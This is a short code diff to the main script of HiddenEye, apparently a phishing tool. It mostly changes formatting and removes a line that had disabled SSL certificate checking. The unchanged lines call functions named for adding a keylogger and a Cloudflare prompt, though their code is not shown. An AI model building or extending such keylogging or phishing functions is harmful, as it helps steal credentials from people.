@@ -1,15 +1,13 @@
 #!/usr/bin/python3
 #
-#HiddenEye by Open Source Community
+# HiddenEye by Open Source Community
 #
 import multiprocessing
 import gettext
-from os import system,environ
+from os import system, environ
 import sys
 import ssl
-if(not environ.get('PYTHONHTTPSVERIFY',"") and getattr(ssl,'_create_unverified_context',None)):
-    ssl._create_default_https_context=ssl._create_unverified_context
-    
+
 from Defs.Checks import *
 from Defs.Configurations import *
 from Defs.Actions import *
@@ -30,7 +28,7 @@ if __name__ == "__main__":
     try:
         runMainMenu()
         mainMenu()
-        
+
         keyloggerprompt()
         addingkeylogger()
         cloudfarePrompt()
